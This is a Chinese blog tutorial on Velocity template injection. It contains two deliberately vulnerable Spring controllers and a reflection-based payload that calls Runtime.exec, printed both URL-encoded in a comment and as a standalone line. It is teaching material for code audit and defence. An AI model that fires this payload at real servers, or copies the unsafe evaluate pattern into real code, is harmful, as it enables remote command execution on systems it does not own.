---
title: Velocity模板注入
date: 2025-11-11 15:15:17
updated: 2025-11-11 15:37:44
tags:
  - Web
  - java
  - 代码审计
---
官方用户手册： https://velocity.apache.org/engine/devel/user-guide.html

Velocity 小于等于 2.2 版本存在模板注入漏洞

  

merge() 方法是将模板和数据合并，成一个文本出。它需要一个 VelocityContext 对象作为参数，用于存储数据，并将数据与模板合并，生成输出。

evaluate() 方法也是将模板和数据合并，生成一个文本输出，但是它返回的是一个布尔值，表示模板是否成功执行。evaluate() 方法通常用于执行带有条件的模板。

# evaluate

> evaluate 方法的基本语法如下：
> 
> public boolean evaluate(Writer writer, Context context, String logTag, String instring) throws ParseErrorException,MethodInvocationException,ResourceNotFoundException, IOException
> 
> -   writer：出结果的写入器，用于将成的结果写入到指定位置。
> -   context：上下文数据，即用于替换模板中占位符的数据。
> -   logTag：日志标签，用于在日志中区分不同的 evaluate 调用。
> -   instring：待处理的 Velocity 模板字符串。
> 
> evaluate 方法返回一个布尔值，表示是否成功执行了模板渲染。如果返回 false，则表示发了错误，可以通过查看日志来获取更多信息。

```java
package com.example.velocityssti;
import org.apache.velocity.VelocityContext;
import org.apache.velocity.app.Velocity;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.GetMapping;
import java.io.StringWriter;
/**
* 编号7089
* @author powerful
*/
@Controller
public class VelocityEvaluate {
    //http://localhost:8080/velocityevaluate?template=%23set($e=%22e%22);$e.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22,null).invoke(null,null).exec(%22calc%22)
    @GetMapping("/velocityevaluate")
    public void velocity(String template) {
        Velocity.init();
        VelocityContext context = new VelocityContext();
        context.put("author", "powerful");
        StringWriter swOut = new StringWriter();
        Velocity.evaluate(context, swOut, "test", template);
    }
}
```

# merge

> merge 方法的基本语法如下：
> 
> public void merge(Template template, Context context, Writer writer) throws ResourceNotFoundException,ParseErrorException,MethodInvocationException,IOException
> 
> -   template：待处理的 Velocity 模板。
> -   context：上下文数据，即用于替换模板中占位符的数据。
> -   writer：出结果的写入器，用于将成的结果写入到指定位置。

```java
package com.example.velocityssti;
import org.apache.velocity.VelocityContext;
import org.apache.velocity.app.Velocity;
import org.apache.velocity.runtime.RuntimeServices;
import org.apache.velocity.runtime.RuntimeSingleton;
import org.apache.velocity.runtime.parser.node.SimpleNode;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import java.io.IOException;
import java.io.StringReader;
import java.io.StringWriter;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.text.ParseException;
/**
* 编号7089
* @author powerful
*/
@Controller
public class VelocityMerge {
    @RequestMapping("/velocitymerge")
    @ResponseBody
    public String velocity2(@RequestParam(defaultValue = "nth347") String username) throws IOException, ParseException,org.apache.velocity.runtime.parser.ParseException {
        String templateString = new String(Files.readAllBytes(Paths.get("C:\\Users\\powerful\\Desktop\\template.vm")));
        templateString = templateString.replace("<USERNAME>", username);
        StringReader reader = new StringReader(templateString);
        VelocityContext ctx = new VelocityContext();
        ctx.put("name", "power7089");
        ctx.put("phone", "70897089");
        ctx.put("email", "power7089@163.com");
        StringWriter out = new StringWriter();
        org.apache.velocity.Template template = new org.apache.velocity.Template();
        RuntimeServices runtimeServices = RuntimeSingleton.getRuntimeServices();
        SimpleNode node = runtimeServices.parse(reader,String.valueOf(template));
        template.setRuntimeServices(runtimeServices);
        template.setData(node);
        template.initDocument();
        template.merge(ctx, out);
        return out.toString();
    }
}
```

从指定路径读取模板文件，如果模板文件中带有攻击载荷语句，即可通过 template.merge 渲染触发模板注入漏洞。

```java
#set($e="e");$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("calc")
```

# 修复

升级至新版本

[https://velocity.apache.org/download.cgi](https://velocity.apache.org/download.cgi)

  

CVE 练习推荐：

如 Solr、协同办公软件，如 confluence、 Jria等被爆存在velocity模版注入漏洞（CVE-2019-17558、CVE-2019-3394、CVE-2021-43947等）。